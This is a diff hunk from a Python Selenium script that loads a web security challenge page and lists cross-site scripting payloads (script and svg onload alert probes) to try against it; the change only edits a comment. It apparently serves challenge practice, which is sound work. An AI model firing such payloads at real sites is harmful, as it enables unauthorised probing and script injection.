@@ -18,7 +18,7 @@ browser = webdriver.Chrome(r"W:\Python Programming/chromedriver.exe")  # you hav
 browser.get('http://ks-challenge.nomanprodhan.com/challenge-9.php')  # target domain
 
 time.sleep(2)
-# you have to add the payloads here
+# you have to add the payloads here | saperate with comma
 payloads = ["<script>alert(document.domain)</script>",
             '"><svg onload=alert(1)//',
             "<svg onload=alert(1)  ",
